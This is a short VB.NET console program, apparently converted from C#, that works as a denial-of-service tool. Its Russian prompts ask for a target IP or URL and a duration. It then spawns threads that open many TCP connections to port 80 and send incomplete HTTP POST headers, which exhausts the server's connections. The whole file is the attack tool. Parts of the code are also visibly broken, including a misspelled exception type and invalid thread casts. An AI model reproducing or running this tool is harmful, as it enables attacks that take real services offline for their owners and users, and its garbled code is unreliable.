Imports System
Imports System.IO
Imports System.Net
Imports System.Net.Sockets
Imports System.Text
Imports System.Linq
Imports System.Threading
Imports System.Threading.Tasks

Namespace DoS
    Class Program
        Dim port As Integer = 80
        Dim ip As String
        Dim sent As Integer

        Public Shared Sub Main(args As String())


            Console.Title = "DoS atack"
            Console.ForegroundColor = ConsoleColor.Red

            Console.Write("Введи ip или URL: ")
            Dim website As String = Console.ReadLine()
            Console.Write("Байт: ")
            Dim s As String = Console.ReadLine()
            Dim count As Integer = 1
            Dim lop As Boolean = True

            New Thread(DirectCast(Function() 
            Dim clients As New List(Of TcpClient)()
            While [lop]
				New Thread(DirectCast(Function() 
                Dim tcpclient As New TcpClient()
                clients.Add(tcpclient)
                Try
                    tcpclient.Connect(website, port)
                    Dim streamwriter As New StreamWriter(DirectCast(tcpclient.GetStream(), Stream))
                    streamwriter.Write((Convert.ToString("POST / HTTP/1.1" & vbCr & vbLf & "Host: ") & website) + vbCr & vbLf & "Content-length: 5235" & vbCr & vbLf & vbCr & vbLf)
                    streamwriter.Flush()
                    If lop Then
                        Console.WriteLine("Отправлено пакетов: " + DirectCast(count, Object))
                    End If
                    count += 1
                Catch ex As Exeption
                    If Not lop Then
                        Return
                    End If
                    Console.WriteLine("Не удаётся отправить пакеты")
                End Try

End Function, ThreadStart)).Start()
                Thread.Sleep(50)
            End While
            For Each tcpclient As TcpClient In clients
                Try
                    tcpclient.GetStream().Dispose()
                Catch
                End Try
            Next

End Function, ThreadStart)).Start()
            Thread.Sleep(Integer.Parse(s) * 1000)
            lop = False
            Console.WriteLine(vbLf & "Done (:")
            Console.WriteLine("Нажмите на клавиатуру чтобы выключить программу ...")
            Console.ReadKey()
        End Sub
    End Class
End Namespace
